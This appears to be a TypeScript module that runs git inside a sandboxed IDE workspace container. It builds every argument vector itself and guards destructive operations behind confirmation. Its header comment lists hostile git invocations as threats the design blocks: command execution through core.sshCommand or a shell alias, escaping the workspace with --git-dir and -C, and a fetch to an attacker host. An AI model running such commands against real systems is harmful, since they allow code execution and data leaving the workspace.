import { normalizePath, PathError } from './workspace.ts';
import type { ContainerRecord } from './lifecycle.ts';
import type { ContainerRuntime } from './runtime/types.ts';
import { GatewayError } from './errors.ts';

/**
 * Real Git, run inside the workspace it belongs to.
 *
 * This is `git` — the program, in the container, against the project's actual
 * files — and not a reimplementation of it. That is the point of the phase: the
 * repository the terminal sees and the repository the IDE sees are the same
 * repository, so `git checkout` in a shell and `git checkout` from the UI
 * cannot disagree.
 *
 * **The client never supplies an argument vector.** Every operation below
 * builds its own argv from a typed request, and that is the whole security
 * design rather than a detail of it. An allowlist of subcommands is not enough,
 * because git's *options* are the dangerous part:
 *
 *   git -c core.sshCommand=… fetch      arbitrary command execution
 *   git -c alias.x='!sh' x              the same, spelled differently
 *   git --git-dir=/ --work-tree=/ …     any path on the host side of the mount
 *   git -C /etc status                  out of the workspace entirely
 *   git fetch https://attacker.example  an outbound request of the caller's choosing
 *
 * None of those can be expressed here, because there is no path from client
 * input to a git flag. Paths are the only free-form input, they go through
 * `normalizePath`, and they are passed after `--` so a file called `--upload-pack`
 * is a filename.
 *
 * **Nothing here reaches the network.** `fetch`, `pull`, `push` and `clone` are
 * absent on purpose: the container runs with `--network none` by default, and
 * the safe way to make them work is not to remove that. GitHub already has a
 * credential path — an Edge Function holding the token server-side — and no
 * token is ever placed in a container, a workspace, or a git config. See
 * `gateway/README.md` for what that leaves unsupported and why.
 *
 * **Destructive operations are refused rather than confirmed away.** A checkout
 * that would overwrite uncommitted work does not silently succeed; it reports
 * what would be lost and requires the caller to say so explicitly.
 */

/** How long any single git invocation may run before it is abandoned. */
const GIT_TIMEOUT_MS = 20_000;
/** Output cap. A `git log` of a large repository is bounded by `-n`, not by hope. */
const GIT_MAX_BUFFER = 4 * 1024 * 1024;
/** Entries returned by a listing operation, so one call cannot be a flood. */
const MAX_ENTRIES = 2000;

export interface GitFileStatus {
  path: string;
  /** Two-letter porcelain code: index status, then worktree status. */
  code: string;
  staged: boolean;
  unstaged: boolean;
  untracked: boolean;
}

export interface GitStatus {
  /** False when the workspace has no repository yet. */
  repository: boolean;
  branch: string | null;
  /** True when the branch has no commits, so HEAD does not resolve. */
  unborn: boolean;
  detached: boolean;
  files: GitFileStatus[];
  /** True when anything is staged, modified or untracked. */
  dirty: boolean;
}

export interface GitCommit {
  hash: string;
  shortHash: string;
  author: string;
  email: string;
  at: number;
  subject: string;
}

export class GitError extends GatewayError {
  constructor(message: string, detail?: string) {
    super('GIT_ERROR', message, detail);
  }
}

export interface GitRunner {
  runtime: ContainerRuntime;
  record: ContainerRecord;
}

/**
 * Run git with a fixed environment.
 *
 * The environment is set here rather than inherited, and each entry earns its
 * place:
 *
 *   GIT_TERMINAL_PROMPT=0   Never block waiting for a username. Without it a
 *                           command that wants credentials hangs until the
 *                           timeout instead of failing.
 *   GIT_ASKPASS / SSH_ASKPASS=''
 *                           Nothing to ask with, so a helper cannot be invoked.
 *   GIT_CONFIG_NOSYSTEM=1   The image's `/etc/gitconfig` cannot introduce an
 *                           alias or a pager that runs a command.
 *   GIT_PAGER=cat           A pager is a subprocess; this one does nothing.
 */
const GIT_ENV = [
  'env',
  'GIT_TERMINAL_PROMPT=0',
  'GIT_ASKPASS=',
  'SSH_ASKPASS=',
  'GIT_CONFIG_NOSYSTEM=1',
  'GIT_PAGER=cat',
  'GIT_OPTIONAL_LOCKS=0',
  'LC_ALL=C',
];

async function git(
  runner: GitRunner,
  args: string[],
): Promise<{ stdout: string; stderr: string; code: number }> {
  return runner.runtime.runCommand(runner.record.id, [...GIT_ENV, 'git', ...args], {
    // The workspace, always. Never a directory the caller named.
    cwd: undefined,
    timeoutMs: GIT_TIMEOUT_MS,
    maxBuffer: GIT_MAX_BUFFER,
  });
}

/** Fails loudly for a command that was supposed to succeed. */
async function gitOrThrow(runner: GitRunner, args: string[], what: string): Promise<string> {
  const result = await git(runner, args);
  if (result.code !== 0) {
    // Git's stderr can name absolute paths inside the container, so it is a
    // detail for the operator rather than the message a user reads.
    throw new GitError(what, result.stderr.trim().slice(0, 400) || `git exited ${result.code}`);
  }
  return result.stdout;
}

/**
 * A caller-supplied path, made safe to hand to git.
 *
 * Two independent problems. `normalizePath` stops traversal and absolute paths,
 * which is the same choke point the sync engine uses. The `--` separator that
 * every caller places before these stops a path being read as an option, which
 * `normalizePath` cannot do because `-f` is a perfectly ordinary filename.
 */
function safePaths(paths: string[]): string[] {
  if (!paths.length) throw new GitError('No files were named.');
  if (paths.length > MAX_ENTRIES) throw new GitError('Too many files in one operation.');
  return paths.map((path) => {
    try {
      return normalizePath(path);
    } catch (error) {
      throw new GitError(
        'That path cannot be used.',
        error instanceof PathError ? error.message : 'invalid path',
      );
    }
  });
}

// ---------------------------------------------------------------------------
// Reading
// ---------------------------------------------------------------------------

/** Whether the workspace holds a repository at all. */
export async function isRepository(runner: GitRunner): Promise<boolean> {
  const result = await git(runner, ['rev-parse', '--is-inside-work-tree']);
  return result.code === 0 && result.stdout.trim() === 'true';
}

/**
 * The working tree's state, parsed from porcelain v2.
 *
 * v2 rather than v1 because it is explicitly a machine format with a stable
 * grammar, and because it reports the branch and the unborn case in the same
 * output — so "what branch am I on, and is anything modified" is one process
 * rather than three.
 */
export async function status(runner: GitRunner): Promise<GitStatus> {
  if (!(await isRepository(runner))) {
    return { repository: false, branch: null, unborn: false, detached: false, files: [], dirty: false };
  }

  const out = await gitOrThrow(
    runner,
    ['status', '--porcelain=v2', '--branch', '--untracked-files=normal', '-z'],
    'Could not read the repository status.',
  );

  const files: GitFileStatus[] = [];
  let branch: string | null = null;
  let unborn = false;
  let detached = false;

  // NUL-separated, because a filename may contain a newline and `-z` is the
  // only spelling of this that is not guessing.
  const records = out.split('\0');
  for (let i = 0; i < records.length; i++) {
    const line = records[i];
    if (!line) continue;

    if (line.startsWith('# branch.head ')) {
      const head = line.slice('# branch.head '.length);
      if (head === '(detached)') detached = true;
      else branch = head;
      continue;
    }
    if (line.startsWith('# branch.oid ')) {
      unborn = line.endsWith('(initial)');
      continue;
    }
    if (line.startsWith('#')) continue;

    if (line.startsWith('1 ') || line.startsWith('2 ')) {
      // `1 <XY> <sub> <mH> <mI> <mW> <hH> <hI> <path>` — and for a rename (`2`),
      // the original path is the *next* NUL-separated record, which is why this
      // consumes it rather than treating it as another entry.
      const fields = line.split(' ');
      const code = fields[1] ?? '??';
      const path = fields.slice(8).join(' ');
      if (line.startsWith('2 ')) i += 1;
      files.push({
        path,
        code,
        staged: code[0] !== '.',
        unstaged: code[1] !== '.',
        untracked: false,
      });
      continue;
    }
    if (line.startsWith('? ')) {
      files.push({
        path: line.slice(2),
        code: '??',
        staged: false,
        unstaged: true,
        untracked: true,
      });
      continue;
    }
    // `u ` is an unmerged path: a conflict. Reported as both sides changed,
    // because that is what it is, and never silently resolved.
    if (line.startsWith('u ')) {
      const fields = line.split(' ');
      files.push({
        path: fields.slice(10).join(' '),
        code: fields[1] ?? 'UU',
        staged: false,
        unstaged: true,
        untracked: false,
      });
    }
  }

  return {
    repository: true,
    branch,
    unborn,
    detached,
    files: files.slice(0, MAX_ENTRIES),
    dirty: files.length > 0,
  };
}

export async function log(runner: GitRunner, limit = 50): Promise<GitCommit[]> {
  if (!(await isRepository(runner))) return [];
  const count = Math.min(Math.max(1, Math.floor(limit)), 500);

  // Unit separators rather than spaces or tabs: a commit subject can contain
  // anything, and a delimiter that can appear in the data is a parser bug.
  const result = await git(runner, [
    'log',
    `-n${count}`,
    '--format=%H\x1f%h\x1f%an\x1f%ae\x1f%at\x1f%s\x1e',
  ]);
  // An unborn branch has no commits, and `git log` exits non-zero saying so.
  if (result.code !== 0) return [];

  return result.stdout
    .split('\x1e')
    .map((entry) => entry.replace(/^\n/, ''))
    .filter(Boolean)
    .map((entry) => {
      const [hash, shortHash, author, email, at, subject] = entry.split('\x1f');
      return {
        hash: hash ?? '',
        shortHash: shortHash ?? '',
        author: author ?? '',
        email: email ?? '',
        at: Number(at ?? 0) * 1000,
        subject: subject ?? '',
      };
    })
    .filter((commit) => commit.hash.length > 0);
}

/** A unified diff, of the working tree or of the index. */
export async function diff(
  runner: GitRunner,
  options: { staged?: boolean; path?: string } = {},
): Promise<string> {
  if (!(await isRepository(runner))) return '';
  const args = ['diff', '--no-color', '--no-ext-diff'];
  if (options.staged) args.push('--staged');
  if (options.path) args.push('--', ...safePaths([options.path]));
  const result = await git(runner, args);
  // A diff larger than the buffer is truncated by the runtime rather than
  // failing; a partial diff is more useful than none, and the UI says so.
  return result.stdout;
}

export async function branches(
  runner: GitRunner,
): Promise<{ current: string | null; all: string[] }> {
  if (!(await isRepository(runner))) return { current: null, all: [] };
  const result = await git(runner, ['branch', '--list', '--format=%(refname:short)']);
  const all = result.stdout.split('\n').map((line) => line.trim()).filter(Boolean);
  const head = await git(runner, ['rev-parse', '--abbrev-ref', 'HEAD']);
  const current = head.code === 0 ? head.stdout.trim() : null;
  return { current: current === 'HEAD' ? null : current, all: all.slice(0, MAX_ENTRIES) };
}

export async function show(runner: GitRunner, ref: string): Promise<string> {
  const result = await git(runner, ['show', '--no-color', '--stat', '--patch', safeRef(ref)]);
  if (result.code !== 0) throw new GitError('That revision could not be read.');
  return result.stdout;
}

export async function revParse(runner: GitRunner, ref: string): Promise<string> {
  const result = await git(runner, ['rev-parse', safeRef(ref)]);
  if (result.code !== 0) throw new GitError('That revision does not exist.');
  return result.stdout.trim();
}

/** Configured remotes, as names and URLs. Read-only: nothing here adds one. */
export async function remotes(runner: GitRunner): Promise<Array<{ name: string; url: string }>> {
  if (!(await isRepository(runner))) return [];
  const result = await git(runner, ['remote', '-v']);
  const seen = new Map<string, string>();
  for (const line of result.stdout.split('\n')) {
    const [name, rest] = line.split('\t');
    if (!name || !rest) continue;
    seen.set(name.trim(), rest.split(' ')[0] ?? '');
  }
  return [...seen].map(([name, url]) => ({ name, url }));
}

// ---------------------------------------------------------------------------
// Writing
// ---------------------------------------------------------------------------

/**
 * A ref name the caller supplied.
 *
 * `git check-ref-format` is the authority on what a branch may be called, but
 * it is a second process; this is the cheap screen in front of it, and its job
 * is narrower — stop anything that could be read as an option or as a path.
 */
function safeRef(ref: string): string {
  const value = String(ref ?? '').trim();
  if (!value || value.length > 255) throw new GitError('That is not a valid revision name.');
  // A leading dash is an option. `..` is a path escape and also a range. `~`
  // and `^` are legitimate revision syntax and are allowed deliberately.
  if (value.startsWith('-') || value.includes('..') || value.includes(':')) {
    throw new GitError('That is not a valid revision name.');
  }
  if (!/^[A-Za-z0-9._/~^@{}-]+$/.test(value)) {
    throw new GitError('That is not a valid revision name.');
  }
  return value;
}

/**
 * Create a repository, and never overwrite one.
 *
 * A project may already contain `.git` — imported from GitHub, restored from a
 * backup, or created in the terminal — and `git init` over an existing
 * repository is not destructive but it is not a no-op either. Refusing keeps
 * the two cases distinguishable.
 */
export async function init(runner: GitRunner): Promise<{ created: boolean }> {
  if (await isRepository(runner)) return { created: false };
  await gitOrThrow(runner, ['init', '--initial-branch=main'], 'Could not create the repository.');
  return { created: true };
}

export async function add(runner: GitRunner, paths: string[]): Promise<void> {
  await gitOrThrow(runner, ['add', '--', ...safePaths(paths)], 'Those files could not be staged.');
}

/** Unstage, keeping the working tree exactly as it is. */
export async function unstage(runner: GitRunner, paths: string[]): Promise<void> {
  const result = await git(runner, ['restore', '--staged', '--', ...safePaths(paths)]);
  // Before the first commit there is no HEAD to restore from, and `rm --cached`
  // is the operation that means the same thing there.
  if (result.code !== 0) {
    await gitOrThrow(
      runner,
      ['rm', '--cached', '-r', '--', ...safePaths(paths)],
      'Those files could not be unstaged.',
    );
  }
}

export interface CommitResult {
  hash: string;
  subject: string;
}

export async function commit(
  runner: GitRunner,
  message: string,
  author: { name: string; email: string },
): Promise<CommitResult> {
  const subject = String(message ?? '').trim();
  if (!subject) throw new GitError('A commit needs a message.');
  if (subject.length > 4000) throw new GitError('That commit message is too long.');

  // Identity is passed per invocation rather than written into the workspace's
  // git config: a config file in the workspace is a file the user's own code
  // can read, and the author's email is theirs rather than the container's.
  const identity = [
    `GIT_AUTHOR_NAME=${author.name || 'TA CODE user'}`,
    `GIT_AUTHOR_EMAIL=${author.email || 'user@ta.code'}`,
    `GIT_COMMITTER_NAME=${author.name || 'TA CODE user'}`,
    `GIT_COMMITTER_EMAIL=${author.email || 'user@ta.code'}`,
  ];

  const result = await runner.runtime.runCommand(
    runner.record.id,
    [...GIT_ENV, ...identity, 'git', 'commit', '--message', subject],
    { timeoutMs: GIT_TIMEOUT_MS, maxBuffer: GIT_MAX_BUFFER },
  );
  if (result.code !== 0) {
    const detail = `${result.stdout}${result.stderr}`;
    if (/nothing to commit/i.test(detail)) throw new GitError('There is nothing staged to commit.');
    throw new GitError('The commit failed.', detail.trim().slice(0, 400));
  }
  const hash = (await git(runner, ['rev-parse', 'HEAD'])).stdout.trim();
  return { hash, subject };
}

export async function createBranch(runner: GitRunner, name: string): Promise<void> {
  const ref = safeRef(name);
  const check = await git(runner, ['check-ref-format', '--branch', ref]);
  if (check.code !== 0) throw new GitError('That is not a valid branch name.');
  await gitOrThrow(runner, ['branch', '--', ref], 'That branch could not be created.');
}

// ---------------------------------------------------------------------------
// Destructive
// ---------------------------------------------------------------------------

export interface DestructivePlan {
  /** Whether the operation would discard uncommitted work. */
  wouldLose: boolean;
  /** The paths at risk, so a person can be told what rather than that. */
  paths: string[];
}

/**
 * What a destructive operation would cost, before it is run.
 *
 * Every caller below asks this first and refuses unless the caller has said
 * `confirm`. That is the difference between an IDE that loses an afternoon of
 * somebody's work and one that does not, and it is deliberately not a
 * preference: `--force` exists in git, and is not offered here.
 */
export async function destructivePlan(runner: GitRunner): Promise<DestructivePlan> {
  const state = await status(runner);
  const paths = state.files.map((file) => file.path);
  return { wouldLose: paths.length > 0, paths: paths.slice(0, 100) };
}

function refuseUnlessConfirmed(plan: DestructivePlan, confirm: boolean, what: string): void {
  if (plan.wouldLose && !confirm) {
    throw new GitError(
      `${what} would discard uncommitted changes in ${plan.paths.length} file${
        plan.paths.length === 1 ? '' : 's'
      }. Commit or stash them first, or confirm to continue.`,
      'refused: unconfirmed destructive operation',
    );
  }
}

export async function checkout(
  runner: GitRunner,
  ref: string,
  options: { confirm?: boolean } = {},
): Promise<void> {
  const target = safeRef(ref);
  const plan = await destructivePlan(runner);
  refuseUnlessConfirmed(plan, options.confirm === true, 'Switching branch');

  // `switch` rather than `checkout`, and without `--force`: git itself refuses
  // when the change would overwrite a modified file, which is a second line of
  // defence behind the check above.
  const result = await git(runner, ['switch', '--', target]);
  if (result.code !== 0) {
    const detached = await git(runner, ['checkout', '--detach', target]);
    if (detached.code !== 0) {
      throw new GitError(
        'That branch could not be checked out.',
        `${result.stderr}${detached.stderr}`.trim().slice(0, 400),
      );
    }
  }
}

export async function discard(
  runner: GitRunner,
  paths: string[],
  options: { confirm?: boolean } = {},
): Promise<void> {
  if (options.confirm !== true) {
    throw new GitError(
      'Discarding changes cannot be undone. Confirm to continue.',
      'refused: unconfirmed destructive operation',
    );
  }
  await gitOrThrow(
    runner,
    ['restore', '--worktree', '--', ...safePaths(paths)],
    'Those changes could not be discarded.',
  );
}

export async function deleteBranch(
  runner: GitRunner,
  name: string,
  options: { confirm?: boolean } = {},
): Promise<void> {
  const ref = safeRef(name);
  if (options.confirm !== true) {
    throw new GitError('Deleting a branch cannot be undone. Confirm to continue.');
  }
  const current = (await git(runner, ['rev-parse', '--abbrev-ref', 'HEAD'])).stdout.trim();
  if (current === ref) throw new GitError('You cannot delete the branch you are on.');

  // `-d`, never `-D`. Git refuses to delete a branch whose commits are not
  // merged anywhere, and that refusal is the safety property — offering the
  // force flag would remove it for the convenience of not reading the error.
  await gitOrThrow(runner, ['branch', '-d', '--', ref], 'That branch could not be deleted.');
}
